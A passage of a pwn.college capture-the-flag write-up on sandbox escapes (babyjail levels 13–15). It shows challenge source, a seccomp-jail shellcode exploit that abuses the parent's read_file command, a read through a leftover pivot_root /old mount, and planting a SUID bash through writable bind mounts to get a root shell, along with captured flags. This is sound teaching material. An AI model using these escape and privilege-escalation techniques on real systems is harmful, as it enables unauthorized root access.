pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4I
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4IT
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM0
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM0E
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM0Ez
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM0EzW
pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM0EzW}

FLAG: pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM0EzW}
```

&nbsp;

## process-isolation

> Escape a different kind of sandbox in which a jailed child process is only communicable to from a parent process.

```c title="/challenge/babyjail_level13.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int child_pid;

void cleanup(int signal)
{
    puts("Time is up: terminating the child and parent!\n");
    kill(child_pid, 9);
    kill(getpid(), 9);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will fork into a jail. Inside of the child process' jail, you will only be able to communicate with the");
    puts("parent process. If you want the flag, you must convince the parent process to give it to you.\n");
    for (int i = 3; i < 10000; i++) close(i);

    puts("Creating a `socketpair` that the child and parent will use to communicate. This is a pair of file descriptors that are");
    puts("connected: data written to one can be read from the other, and vice-versa.\n");
    int file_descriptors[2];
    assert(socketpair(AF_UNIX, SOCK_STREAM, 0, file_descriptors) == 0);
    int parent_socket = file_descriptors[0];
    int child_socket = file_descriptors[1];

    printf("The parent side of the socketpair is FD %d.\n", parent_socket);
    printf("The child side of the socketpair is FD %d.\n", child_socket);

    puts("Registering a cleanup function that will run 1 second from now and terminate both the parent and child.\n");
    alarm(1);
    signal(SIGALRM, cleanup);

    puts("Forking into a parent and child (sandbox) process.\n");
    child_pid = fork();
    if (!child_pid)
    {
        puts("The child will now close itself off from the world, except for the child side of the socketpair.\n");
        close(0);
        close(1);
        close(2);
        close(parent_socket);

        void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
        assert(shellcode == (void *)0x1337000);
        printf("The child mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

        scmp_filter_ctx ctx;

        puts("Restricting system calls (default: kill).\n");
        ctx = seccomp_init(SCMP_ACT_KILL);
        printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
        printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
        printf("Allowing syscall: %s (number %i).\n", "exit", SCMP_SYS(exit));
        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) == 0);

        assert(seccomp_load(ctx) == 0);

        read(child_socket, shellcode, 0x1000);

        write(child_socket, "print_msg:Executing shellcode!", 128);

        ((void(*)())shellcode)();
    }

    else
    {
        puts("The parent is reading 0x1000 bytes of shellcode from stdin.\n");
        char shellcode[0x1000];
        read(0, shellcode, 0x1000);

        puts("The parent is sending the shellcode to the child.\n");
        write(parent_socket, shellcode, 0x1000);

        while (true)
        {
            char command[128] = { 0 };

            puts("The parent is waiting for a command from the child.\n");
            int command_size = read(parent_socket, command, 128);
            command[9] = '\0';

            char *command_argument = &command[10];
            int command_argument_size = command_size - 10;

            printf("The parent received command `%.10s` with an argument of %d bytes from the child.\n", command, command_argument_size);

            if (strcmp(command, "print_msg") == 0)
            {
                puts(command_argument);
            }
            else if (strcmp(command, "read_file") == 0)
            {
                sendfile(parent_socket, open(command_argument, 0), 0, 128);
            }
            else
            {
                puts("Error: unknown command!\n");
                break;
            }
        }
    }
}
```

This challenge forks into a parent and child process connected through a socketpair.

The child process is sandboxed with `seccomp` and only allows:
- `read`
- `write`
- `exit`

It also closes STDIN, STDOUT, STDERR, so the child cannot directly print anything or access files itself.

However, the parent exposes a command interface over the socket:

```c title="" showLineNumbers
# ---- snip ----

            else if (strcmp(command, "read_file") == 0)
            {
                sendfile(parent_socket, open(command_argument, 0), 0, 128);
            }

# ---- snip ----
```

This means the child can ask the parent to open arbitrary files and send their contents back.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"

shellcode = asm(r"""
    /* socket fd is 4 */
    mov rdi, 4

    /* write(4, "read_file:/flag", 128) */
    lea rsi, [rip + req]
    mov rdx, 128
    mov rax, 1
    syscall

    /* read flag back from parent */
    mov rdi, 4
    lea rsi, [rip + buf]
    mov rdx, 128
    xor eax, eax
    syscall

    /* send print_msg:<flag> */
    mov rdi, 4
    lea rsi, [rip + msg]
    mov rdx, 10
    mov rax, 1
    syscall

    mov rdi, 4
    lea rsi, [rip + buf]
    mov rdx, 128
    mov rax, 1
    syscall

    mov eax, 60
    xor edi, edi
    syscall

req:
    .ascii "read_file:/flag"
    .zero 112

msg:
    .ascii "print_msg:"

buf:
    .space 128
""")

p = process("/challenge/babyjail_level13")
p.send(shellcode)
p.interactive()
```

```
hacker@sandboxing~process-isolation:~$ python ~/script.py
[+] Starting local process '/challenge/babyjail_level13': pid 9152
[*] Switching to interactive mode
###
### Welcome to /challenge/babyjail_level13!
###

This challenge will fork into a jail. Inside of the child process' jail, you will only be able to communicate with the
parent process. If you want the flag, you must convince the parent process to give it to you.

Creating a `socketpair` that the child and parent will use to communicate. This is a pair of file descriptors that are
connected: data written to one can be read from the other, and vice-versa.

The parent side of the socketpair is FD 3.
The child side of the socketpair is FD 4.
Registering a cleanup function that will run 1 second from now and terminate both the parent and child.

Forking into a parent and child (sandbox) process.

The parent is reading 0x1000 bytes of shellcode from stdin.

The parent is sending the shellcode to the child.

The parent is waiting for a command from the child.

The child will now close itself off from the world, except for the child side of the socketpair.

[*] Process '/challenge/babyjail_level13' stopped with exit code 0 (pid 9152)
The parent received command `print_msg` with an argument of 118 bytes from the child.
Executing shellcode!
The parent is waiting for a command from the child.

The parent received command `read_file` with an argument of 118 bytes from the child.
The parent is waiting for a command from the child.

The parent received command `print_msg` with an argument of 118 bytes from the child.
pwn.college{EVmH-bA6jU8y4TbvwJYEQigkn-H.01M0IDL4ITM0EzW}

The parent is waiting for a command from the child.

The parent received command `` with an argument of 0 bytes from the child.
Error: unknown command!

[*] Got EOF while reading in interactive
$  
```

&nbsp;

## mount-namespace

> Learn the implications of a different way of sandboxing, using modern namespacing techniques! But what if the sandbox is really sloppy?

```c title="/challenge/babyjail_level14.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <sys/syscall.h>
#include <sys/mount.h>
#include <dirent.h>
#include <limits.h>
#include <sched.h>

char hostname[128];

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    gethostname(hostname, 128);
    if (strstr(hostname, "-level") && !strstr(hostname, "vm_"))
    {
        puts("ERROR: in the dojo, this challenge MUST run in virtualization mode.");
        exit(1);
    }

    puts("This challenge will use mount namespace and pivot_root to put you into a jail in /tmp/jail-XXXXXX...\n");

    for (int i = 3; i < 10000; i++) close(i);

    char new_root[] = "/tmp/jail-XXXXXX";
    char old_root[PATH_MAX];

    puts("Checking that the challenge is running as root (otherwise things will fail)...");
    assert(geteuid() == 0);

    puts("Splitting off into our own mount namespace...");
    assert(unshare(CLONE_NEWNS) != -1);

    puts("Creating a jail structure!");
    puts("... creating jail root...");
    assert(mkdtemp(new_root) != NULL);
    printf("... created jail root at `%s`.\n", new_root);

    puts("... changing the old / to a private mount so that pivot_root succeeds later.");
    assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);

    puts("... bind-mounting the new root over itself so that it becomes a 'mount point' for pivot_root() later.");
    assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);

    puts("... creating a directory in which pivot_root will put the old root filesystem.");
    snprintf(old_root, sizeof(old_root), "%s/old", new_root);
    assert(mkdir(old_root, 0777) != -1);

    puts("... pivoting the root filesystem!");
    assert(syscall(SYS_pivot_root, new_root, old_root) != -1);

    assert(mkdir("/bin", 0755) != -1);
    puts("... bind-mounting /bin into the jail.");
    assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);

    assert(mkdir("/usr", 0755) != -1);
    puts("... bind-mounting /usr into the jail.");
    assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);

    assert(mkdir("/lib", 0755) != -1);
    puts("... bind-mounting /lib into the jail.");
    assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);

    assert(mkdir("/lib64", 0755) != -1);
    puts("... bind-mounting /lib64 into the jail.");
    assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);

    setresuid(0, 0, 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    puts("Executing a shell inside the sandbox! Good luck!");
    assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);

    printf("### Goodbye!\n");
}
```

This challenge uses `pivot_root()` instead of `chroot()` to jail us.

The process first creates an isolated mount namespace:

```c
# ---- snip ----

unshare(CLONE_NEWNS)

# ---- snip ----
```

It then creates a temporary jail directory, bind-mounts it over itself so it becomes a proper mount point, creates an `old` subdirectory inside it, and calls `pivot_root`:

```c
# ---- snip ----

mount(new_root, new_root, NULL, MS_BIND, NULL) != -1

# ---- snip ----

syscall(SYS_pivot_root, new_root, old_root)

# ---- snip ----
```

After this, `/` points to the new jail, and the previous real root filesystem is placed at `/old`.
The challenge then bind-mounts `/old/bin`, `/old/usr`, `/old/lib`, and `/old/lib64` into the jail so that bash can run correctly inside it.

Finally, a fake flag is written:

```c
# ---- snip ----

int fffd = open("/flag", O_WRONLY | O_CREAT);
write(fffd, "FLAG{FAKE}", 10);

# ---- snip ----
```

And a shell is spawned:

```c
# ---- snip ----

execl("/bin/bash", "/bin/bash", "-p", NULL)

# ---- snip ----
```

The problem is that the challenge never unmounts `/old` after the pivot.

A secure implementation would do:

```c
umount2("/old", MNT_DETACH);
rmdir("/old");
```

Since neither of these is called, the entire original filesystem remains reachable through `/old`.

### Exploit

Since we are given a shell directly, the solve is trivial.

```bash
cat /old/flag
```

```python title="~/script.py" showLineNumbers
from pwn import *

context.log_level = "error"

p = process("/challenge/babyjail_level14")

p.recvuntil(b"Good luck!")

p.sendline(b"cat /old/flag")

p.interactive()
```

```
hacker@sandboxing~mount-namespace:~$ python ~/script.py

pwn.college{E1DzP23CAC0z2QF2rth1RBmawyx.ddDMzMDL4ITM0EzW}
$  
```

&nbsp;

## mount-namespace-2

> Learn the implications of a different way of sandboxing, using modern namespacing techniques! But what if the sandbox is really sloppy?

```c title="/challenge/babyjail_level15.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <sys/syscall.h>
#include <sys/mount.h>
#include <dirent.h>
#include <limits.h>
#include <sched.h>

char hostname[128];

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    gethostname(hostname, 128);
    if (strstr(hostname, "-level") && !strstr(hostname, "vm_"))
    {
        puts("ERROR: in the dojo, this challenge MUST run in virtualization mode.");
        exit(1);
    }

    puts("This challenge will use mount namespace and pivot_root to put you into a jail in /tmp/jail-XXXXXX...\n");

    for (int i = 3; i < 10000; i++) close(i);

    char new_root[] = "/tmp/jail-XXXXXX";
    char old_root[PATH_MAX];

    puts("Checking that the challenge is running as root (otherwise things will fail)...");
    assert(geteuid() == 0);

    puts("Splitting off into our own mount namespace...");
    assert(unshare(CLONE_NEWNS) != -1);

    puts("Creating a jail structure!");
    puts("... creating jail root...");
    assert(mkdtemp(new_root) != NULL);
    printf("... created jail root at `%s`.\n", new_root);

    puts("... changing the old / to a private mount so that pivot_root succeeds later.");
    assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);

    puts("... bind-mounting the new root over itself so that it becomes a 'mount point' for pivot_root() later.");
    assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);

    puts("... creating a directory in which pivot_root will put the old root filesystem.");
    snprintf(old_root, sizeof(old_root), "%s/old", new_root);
    assert(mkdir(old_root, 0777) != -1);

    puts("... pivoting the root filesystem!");
    assert(syscall(SYS_pivot_root, new_root, old_root) != -1);

    assert(mkdir("/bin", 0755) != -1);
    puts("... bind-mounting /bin into the jail.");
    assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);

    puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
    assert(mkdir("/usr", 0755) != -1);
    puts("... bind-mounting /usr into the jail.");
    assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);

    puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
    assert(mkdir("/lib", 0755) != -1);
    puts("... bind-mounting /lib into the jail.");
    assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);

    puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
    assert(mkdir("/lib64", 0755) != -1);
    puts("... bind-mounting /lib64 into the jail.");
    assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);

    puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");

    puts("... unmounting old root directory.");
    assert(umount2("/old", MNT_DETACH) != -1);
    assert(rmdir("/old") != -1);

    setresuid(0, 0, 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    puts("Executing a shell inside the sandbox! Good luck!");
    assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);

    printf("### Goodbye!\n");
}
```

This level fixes the previous mistake — the old root is now properly detached after the pivot:

```c
puts("... unmounting old root directory.");
assert(umount2("/old", MNT_DETACH) != -1);
assert(rmdir("/old") != -1);
```

So `/old` is gone and the previous escape no longer works.

### The Bug

However, before unmounting `/old`, the challenge bind-mounts several directories from the real filesystem into the jail:

```c
assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);
assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);
assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);
assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);
```

The source even hints at this:

```c
puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
```

These bind mounts are independent mount table entries that point directly at the underlying inodes of `/bin`, `/usr`, `/lib`, `/lib64` on the real host filesystem. Since the jail runs as root and these mounts are writable, any file we create inside `/bin` from within the jail is actually written to the real host's `/bin`.

### Exploit

We abuse the writable bind mount to plant a SUID bash binary into the real host's `/bin`.

**Step 1** - From inside the jail, copy bash and set the SUID bit on it:

```python
from pwn import *

context.log_level = "error"

p = process("/challenge/babyjail_level15")

p.recvuntil(b"Good luck!")

p.sendline(b"cp /bin/bash /bin/bashsuid; chmod 4755 /bin/bashsuid")

p.sendline(b"echo done")

p.recvuntil(b"done")

p.close()
```

Since `/bin` is bind-mounted from the real host, `/bin/bashsuid` now exists on the actual host filesystem with the SUID bit set.

**Step 2** - From a terminal outside the jail, run it with `-p` to preserve SUID privileges:

```
hacker@sandboxing~mount-cleanup:~$ /bin/bashsuid -p
```

This drops us into a root shell on the real host. Then:

```
bashsuid-5.0# cat /flag
pwn.college{IH60WiwTvVZzkOYQdXpKfLset9i.dhDMzMDL4ITM0EzW}
```